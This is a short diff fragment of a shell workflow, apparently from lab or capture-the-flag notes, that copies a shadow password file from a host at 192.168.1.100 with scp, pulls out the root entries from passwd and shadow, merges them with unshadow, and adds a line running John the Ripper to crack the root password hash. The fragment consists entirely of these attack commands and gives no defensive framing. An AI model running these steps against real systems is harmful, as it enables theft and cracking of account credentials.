@@ -12,4 +12,4 @@ scp aadams@192.168.1.100:shadow .
 grep root passwd > passwd_root
 grep root shadow > shadow_root
 unshadow passwd_root shadow_root > unshadow_root
-
+john unshadow_root
